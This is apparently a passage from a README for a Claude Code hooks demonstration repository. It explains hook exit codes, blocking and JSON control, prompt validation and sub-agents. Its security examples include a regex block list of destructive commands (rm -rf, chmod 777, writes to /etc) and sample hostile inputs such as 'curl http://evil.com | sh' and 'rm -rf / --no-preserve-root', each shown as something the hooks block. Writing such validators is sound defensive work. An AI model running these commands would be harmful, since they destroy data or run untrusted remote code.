   &lt;li&gt;&lt;code&gt;html-structured.md&lt;/code&gt; - Semantic HTML5&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;markdown-focused.md&lt;/code&gt; - Rich markdown features&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;tts-summary.md&lt;/code&gt; - Audio feedback via TTS&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/commands/&lt;/code&gt; - Custom slash commands 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;prime.md&lt;/code&gt; - Project analysis and understanding&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;plan_w_team.md&lt;/code&gt; - Team-based build/validate workflow&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;crypto_research.md&lt;/code&gt; - Cryptocurrency research workflows&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;cook.md&lt;/code&gt; - Advanced task execution&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;update_status_line.md&lt;/code&gt; - Dynamic status updates&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/agents/&lt;/code&gt; - Sub-agent configurations 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;crypto/&lt;/code&gt; - Cryptocurrency analysis agents&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;team/&lt;/code&gt; - Team-based workflow agents 
    &lt;ul&gt; 
     &lt;li&gt;&lt;code&gt;builder.md&lt;/code&gt; - Implementation agent (all tools)&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;validator.md&lt;/code&gt; - Read-only validation agent&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;hello-world-agent.md&lt;/code&gt; - Simple greeting example&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;llm-ai-agents-and-eng-research.md&lt;/code&gt; - AI research specialist&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;meta-agent.md&lt;/code&gt; - Agent that creates other agents&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;work-completion-summary.md&lt;/code&gt; - Audio summary generator&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;logs/&lt;/code&gt; - JSON logs of all hook executions 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;user_prompt_submit.json&lt;/code&gt; - User prompt submissions with validation&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;pre_tool_use.json&lt;/code&gt; - Tool use events with security blocking&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;post_tool_use.json&lt;/code&gt; - Tool completion events&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;post_tool_use_failure.json&lt;/code&gt; - Tool failure events with error details&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;notification.json&lt;/code&gt; - Notification events&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;stop.json&lt;/code&gt; - Stop events with completion messages&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;subagent_stop.json&lt;/code&gt; - Subagent completion events&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;subagent_start.json&lt;/code&gt; - Subagent spawn events&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;pre_compact.json&lt;/code&gt; - Pre-compaction events with trigger type&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;session_start.json&lt;/code&gt; - Session start events with source type&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;session_end.json&lt;/code&gt; - Session end events with reason&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;permission_request.json&lt;/code&gt; - Permission request audit log&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;setup.json&lt;/code&gt; - Setup events with trigger type&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;chat.json&lt;/code&gt; - Readable conversation transcript (generated by --chat flag)&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ai_docs/&lt;/code&gt; - Documentation resources 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;cc_hooks_docs.md&lt;/code&gt; - Complete hooks documentation from Anthropic&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;claude_code_status_lines_docs.md&lt;/code&gt; - Status line input schema and configuration&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;user_prompt_submit_hook.md&lt;/code&gt; - Comprehensive UserPromptSubmit hook documentation&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;uv-single-file-scripts.md&lt;/code&gt; - UV script architecture documentation&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;anthropic_custom_slash_commands.md&lt;/code&gt; - Slash commands documentation&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;anthropic_docs_subagents.md&lt;/code&gt; - Sub-agents documentation&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ruff.toml&lt;/code&gt; - Ruff linter configuration for Python code quality&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ty.toml&lt;/code&gt; - Type checker configuration for Python type validation&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Hooks provide deterministic control over Claude Code behavior without relying on LLM decisions.&lt;/p&gt; 
&lt;h2&gt;Features Demonstrated&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Prompt validation and security filtering&lt;/li&gt; 
 &lt;li&gt;Context injection for enhanced AI responses&lt;/li&gt; 
 &lt;li&gt;Command logging and auditing&lt;/li&gt; 
 &lt;li&gt;Automatic transcript conversion&lt;/li&gt; 
 &lt;li&gt;Permission-based tool access control&lt;/li&gt; 
 &lt;li&gt;Error handling in hook execution&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Run any Claude Code command to see hooks in action via the &lt;code&gt;logs/&lt;/code&gt; files.&lt;/p&gt; 
&lt;h2&gt;Hook Error Codes &amp;amp; Flow Control&lt;/h2&gt; 
&lt;p&gt;Claude Code hooks provide powerful mechanisms to control execution flow and provide feedback through exit codes and structured JSON output.&lt;/p&gt; 
&lt;h3&gt;Exit Code Behavior&lt;/h3&gt; 
&lt;p&gt;Hooks communicate status and control flow through exit codes:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Exit Code&lt;/th&gt; 
   &lt;th&gt;Behavior&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;0&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Success&lt;/td&gt; 
   &lt;td&gt;Hook executed successfully. &lt;code&gt;stdout&lt;/code&gt; shown to user in transcript mode (Ctrl-R)&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;2&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Blocking Error&lt;/td&gt; 
   &lt;td&gt;&lt;strong&gt;Critical&lt;/strong&gt;: &lt;code&gt;stderr&lt;/code&gt; is fed back to Claude automatically. See hook-specific behavior below&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Other&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Non-blocking Error&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;stderr&lt;/code&gt; shown to user, execution continues normally&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h3&gt;Hook-Specific Flow Control&lt;/h3&gt; 
&lt;p&gt;Each hook type has different capabilities for blocking and controlling Claude Code's behavior:&lt;/p&gt; 
&lt;h4&gt;UserPromptSubmit Hook - &lt;strong&gt;CAN BLOCK PROMPTS &amp;amp; ADD CONTEXT&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Intercepts user prompts before Claude processes them&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: Blocks the prompt entirely, shows error message to user&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Prompt validation, security filtering, context injection, audit logging&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: Our &lt;code&gt;user_prompt_submit.py&lt;/code&gt; logs all prompts and can validate them&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;PreToolUse Hook - &lt;strong&gt;CAN BLOCK TOOL EXECUTION&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Intercepts tool calls before they execute&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: Blocks the tool call entirely, shows error message to Claude&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Security validation, parameter checking, dangerous command prevention&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: Our &lt;code&gt;pre_tool_use.py&lt;/code&gt; blocks &lt;code&gt;rm -rf&lt;/code&gt; commands with exit code 2&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# Block dangerous commands
if is_dangerous_rm_command(command):
    print("BLOCKED: Dangerous rm command detected", file=sys.stderr)
    sys.exit(2)  # Blocks tool call, shows error to Claude
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;PostToolUse Hook - &lt;strong&gt;CANNOT BLOCK (Tool Already Executed)&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Provides feedback after tool completion&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: Shows error to Claude (tool already ran, cannot be undone)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Validation of results, formatting, cleanup, logging&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Limitation&lt;/strong&gt;: Cannot prevent tool execution since it fires after completion&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Notification Hook - &lt;strong&gt;CANNOT BLOCK&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Handles Claude Code notifications&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: N/A - shows stderr to user only, no blocking capability&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Custom notifications, logging, user alerts&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Limitation&lt;/strong&gt;: Cannot control Claude Code behavior, purely informational&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Stop Hook - &lt;strong&gt;CAN BLOCK STOPPING&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Intercepts when Claude Code tries to finish responding&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: Blocks stoppage, shows error to Claude (forces continuation)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Ensuring tasks complete, validation of final state use this to FORCE CONTINUATION&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Caution&lt;/strong&gt;: Can cause infinite loops if not properly controlled&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;SubagentStop Hook - &lt;strong&gt;CAN BLOCK SUBAGENT STOPPING&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Intercepts when Claude Code subagents try to finish&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: Blocks subagent stoppage, shows error to subagent&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Ensuring subagent tasks complete properly&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: Our &lt;code&gt;subagent_stop.py&lt;/code&gt; logs events and announces completion&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;PreCompact Hook - &lt;strong&gt;CANNOT BLOCK&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Fires before compaction operations&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: N/A - shows stderr to user only, no blocking capability&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Transcript backup, context preservation, pre-compaction logging&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: Our &lt;code&gt;pre_compact.py&lt;/code&gt; creates transcript backups before compaction&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;SessionStart Hook - &lt;strong&gt;CANNOT BLOCK&lt;/strong&gt;&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Control Point&lt;/strong&gt;: Fires when new sessions start or resume&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2 Behavior&lt;/strong&gt;: N/A - shows stderr to user only, no blocking capability&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Cases&lt;/strong&gt;: Loading development context, session initialization, environment setup&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Example&lt;/strong&gt;: Our &lt;code&gt;session_start.py&lt;/code&gt; loads git status, recent issues, and context files&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Advanced JSON Output Control&lt;/h3&gt; 
&lt;p&gt;Beyond simple exit codes, hooks can return structured JSON for sophisticated control:&lt;/p&gt; 
&lt;h4&gt;Common JSON Fields (All Hook Types)&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "continue": true,           // Whether Claude should continue (default: true)
  "stopReason": "string",     // Message when continue=false (shown to user)
  "suppressOutput": true      // Hide stdout from transcript (default: false)
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;PreToolUse Decision Control&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "decision": "approve" | "block" | undefined,
  "reason": "Explanation for decision"
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;"approve"&lt;/strong&gt;: Bypasses permission system, &lt;code&gt;reason&lt;/code&gt; shown to user&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;"block"&lt;/strong&gt;: Prevents tool execution, &lt;code&gt;reason&lt;/code&gt; shown to Claude&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;undefined&lt;/strong&gt;: Normal permission flow, &lt;code&gt;reason&lt;/code&gt; ignored&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;PostToolUse Decision Control&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "decision": "block" | undefined,
  "reason": "Explanation for decision"
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;"block"&lt;/strong&gt;: Automatically prompts Claude with &lt;code&gt;reason&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;undefined&lt;/strong&gt;: No action, &lt;code&gt;reason&lt;/code&gt; ignored&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Stop Decision Control&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "decision": "block" | undefined,
  "reason": "Must be provided when blocking Claude from stopping"
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;"block"&lt;/strong&gt;: Prevents Claude from stopping, &lt;code&gt;reason&lt;/code&gt; tells Claude how to proceed&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;undefined&lt;/strong&gt;: Allows normal stopping, &lt;code&gt;reason&lt;/code&gt; ignored&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Flow Control Priority&lt;/h3&gt; 
&lt;p&gt;When multiple control mechanisms are used, they follow this priority:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;code&gt;"continue": false&lt;/code&gt;&lt;/strong&gt; - Takes precedence over all other controls&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;code&gt;"decision": "block"&lt;/code&gt;&lt;/strong&gt; - Hook-specific blocking behavior&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Exit Code 2&lt;/strong&gt; - Simple blocking via stderr&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Other Exit Codes&lt;/strong&gt; - Non-blocking errors&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Security Implementation Examples&lt;/h3&gt; 
&lt;h4&gt;1. Command Validation (PreToolUse)&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# Block dangerous patterns
dangerous_patterns = [
    r'rm\s+.*-[rf]',           # rm -rf variants
    r'sudo\s+rm',              # sudo rm commands
    r'chmod\s+777',            # Dangerous permissions
    r'&amp;gt;\s*/etc/',              # Writing to system directories
]

for pattern in dangerous_patterns:
    if re.search(pattern, command, re.IGNORECASE):
        print(f"BLOCKED: {pattern} detected", file=sys.stderr)
        sys.exit(2)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;2. Result Validation (PostToolUse)&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# Validate file operations
if tool_name == "Write" and not tool_response.get("success"):
    output = {
        "decision": "block",
        "reason": "File write operation failed, please check permissions and retry"
    }
    print(json.dumps(output))
    sys.exit(0)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;3. Completion Validation (Stop Hook)&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# Ensure critical tasks are complete
if not all_tests_passed():
    output = {
        "decision": "block",
        "reason": "Tests are failing. Please fix failing tests before completing."
    }
    print(json.dumps(output))
    sys.exit(0)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Hook Execution Environment&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Timeout&lt;/strong&gt;: 60-second execution limit per hook&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Parallelization&lt;/strong&gt;: All matching hooks run in parallel&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Environment&lt;/strong&gt;: Inherits Claude Code's environment variables&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Working Directory&lt;/strong&gt;: Runs in current project directory&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Input&lt;/strong&gt;: JSON via stdin with session and tool data&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Output&lt;/strong&gt;: Processed via stdout/stderr with exit codes&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;UserPromptSubmit Hook Deep Dive&lt;/h2&gt; 
&lt;p&gt;The UserPromptSubmit hook is the first line of defense and enhancement for Claude Code interactions. It fires immediately when you submit a prompt, before Claude even begins processing it.&lt;/p&gt; 
&lt;h3&gt;What It Can Do&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;Log prompts&lt;/strong&gt; - Records every prompt with timestamp and session ID&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Block prompts&lt;/strong&gt; - Exit code 2 prevents Claude from seeing the prompt&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Add context&lt;/strong&gt; - Print to stdout adds text before your prompt that Claude sees&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Validate content&lt;/strong&gt; - Check for dangerous patterns, secrets, policy violations&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;How It Works&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;You type a prompt&lt;/strong&gt; ‚Üí Claude Code captures it&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;UserPromptSubmit hook fires&lt;/strong&gt; ‚Üí Receives JSON with your prompt&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Hook processes&lt;/strong&gt; ‚Üí Can log, validate, block, or add context&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Claude receives&lt;/strong&gt; ‚Üí Either blocked message OR original prompt + any context&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Example Use Cases&lt;/h3&gt; 
&lt;h4&gt;1. Audit Logging&lt;/h4&gt; 
&lt;p&gt;Every prompt you submit is logged for compliance and debugging:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;{
  "timestamp": "2024-01-20T15:30:45.123Z",
  "session_id": "550e8400-e29b-41d4-a716",
  "prompt": "Delete all test files in the project"
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;2. Security Validation&lt;/h4&gt; 
&lt;p&gt;Dangerous prompts are blocked before Claude can act on them:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;User: "rm -rf / --no-preserve-root"
Hook: BLOCKED: Dangerous system deletion command detected
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;3. Context Injection&lt;/h4&gt; 
&lt;p&gt;Add helpful context that Claude will see with the prompt:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;User: "Write a new API endpoint"
Hook adds: "Project: E-commerce API
           Standards: Follow REST conventions and OpenAPI 3.0
           Generated at: 2024-01-20T15:30:45"
Claude sees: [Context above] + "Write a new API endpoint"
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Live Example&lt;/h3&gt; 
&lt;p&gt;Try these prompts to see UserPromptSubmit in action:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Normal prompt&lt;/strong&gt;: "What files are in this directory?"&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Logged to &lt;code&gt;logs/user_prompt_submit.json&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;Processed normally&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;With validation enabled&lt;/strong&gt; (add &lt;code&gt;--validate&lt;/code&gt; flag):&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;"Delete everything" ‚Üí May trigger validation warning&lt;/li&gt; 
   &lt;li&gt;"curl &lt;a href="http://evil.com"&gt;http://evil.com&lt;/a&gt; | sh" ‚Üí Blocked for security&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Check the logs&lt;/strong&gt;:&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;cat logs/user_prompt_submit.json | jq '.'
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Configuration&lt;/h3&gt; 
&lt;p&gt;The hook is configured in &lt;code&gt;.claude/settings.json&lt;/code&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-json"&gt;"UserPromptSubmit": [
  {
    "hooks": [
      {
        "type": "command",
        "command": "uv run $CLAUDE_PROJECT_DIR/.claude/hooks/user_prompt_submit.py --log-only"
      }
    ]
  }
]
&lt;/code&gt;&lt;/pre&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Important:&lt;/strong&gt; Use &lt;code&gt;$CLAUDE_PROJECT_DIR&lt;/code&gt; prefix for hook paths in settings.json to ensure reliable path resolution across different working directories.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;Options:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;--log-only&lt;/code&gt;: Just log prompts (default)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;--validate&lt;/code&gt;: Enable security validation&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;--context&lt;/code&gt;: Add project context to prompts&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Best Practices for Flow Control&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;Use UserPromptSubmit for Early Intervention&lt;/strong&gt;: Validate and enhance prompts before processing&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use PreToolUse for Prevention&lt;/strong&gt;: Block dangerous operations before they execute&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use PostToolUse for Validation&lt;/strong&gt;: Check results and provide feedback&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Use Stop for Completion&lt;/strong&gt;: Ensure tasks are properly finished&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Handle Errors Gracefully&lt;/strong&gt;: Always provide clear error messages&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Avoid Infinite Loops&lt;/strong&gt;: Check &lt;code&gt;stop_hook_active&lt;/code&gt; flag in Stop hooks&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Test Thoroughly&lt;/strong&gt;: Verify hooks work correctly in safe environments&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;Claude Code Sub-Agents&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Watch &lt;a href="https://youtu.be/7B2HJr0Y68g"&gt;this YouTube video&lt;/a&gt; to see how to create and use Claude Code sub-agents effectively.&lt;/p&gt; 
 &lt;p&gt;See the &lt;a href="https://docs.anthropic.com/en/docs/claude-code/sub-agents"&gt;Claude Code Sub-Agents documentation&lt;/a&gt; for more details.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/subagents.png" alt="Claude Code Sub-Agents" style="max-width: 800px; width: 100%;" /&gt; 
&lt;p&gt;Claude Code supports specialized sub-agents that handle specific tasks with custom system prompts, tools, and separate context windows. Sub-agents are AI assistants that your primary Claude Code agent can delegate tasks to.&lt;/p&gt; 
&lt;h3&gt;Understanding Sub-Agents: System Prompts, Not User Prompts&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Critical Concept&lt;/strong&gt;: The content in agent files (&lt;code&gt;.claude/agents/*.md&lt;/code&gt;) are &lt;strong&gt;system prompts&lt;/strong&gt; that configure the sub-agent's behavior. They are NOT user prompts. This is the #1 misunderstanding when creating agents.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Information Flow&lt;/strong&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;You (User) ‚Üí Primary Agent ‚Üí Sub-Agent ‚Üí Primary Agent ‚Üí You (User)
&lt;/code&gt;&lt;/pre&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/SubAgentFlow.gif" alt="Sub-Agent Information Flow" style="max-width: 800px; width: 100%;" /&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;You&lt;/strong&gt; make a request to Claude Code (primary agent)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Agent&lt;/strong&gt; analyzes your request and delegates to appropriate sub-agent&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Sub-Agent&lt;/strong&gt; executes task using its system prompt instructions&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Sub-Agent&lt;/strong&gt; reports results back to primary agent&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Primary Agent&lt;/strong&gt; synthesizes and presents results to you&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;strong&gt;Key Points&lt;/strong&gt;:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Sub-agents NEVER communicate directly with you&lt;/li&gt; 
 &lt;li&gt;Sub-agents start fresh with no conversation history&lt;/li&gt; 
 &lt;li&gt;Sub-agents respond to the primary agent's prompt, not yours&lt;/li&gt; 
 &lt;li&gt;The &lt;code&gt;description&lt;/code&gt; field tells the primary agent WHEN to use the sub-agent&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Agent Storage &amp;amp; Organization&lt;/h3&gt; 
&lt;p&gt;This repository demonstrates various agent configurations:&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Project Agents&lt;/strong&gt; (&lt;code&gt;.claude/agents/&lt;/code&gt;):&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;.claude/agents/
‚îú‚îÄ‚îÄ crypto/                    # Cryptocurrency analysis agents
‚îÇ   ‚îú‚îÄ‚îÄ crypto-coin-analyzer-haiku.md
‚îÇ   ‚îú‚îÄ‚îÄ crypto-coin-analyzer-opus.md
‚îÇ   ‚îú‚îÄ‚îÄ crypto-coin-analyzer-sonnet.md
‚îÇ   ‚îú‚îÄ‚îÄ crypto-investment-plays-*.md
‚îÇ   ‚îú‚îÄ‚îÄ crypto-market-agent-*.md
‚îÇ   ‚îú‚îÄ‚îÄ crypto-movers-haiku.md
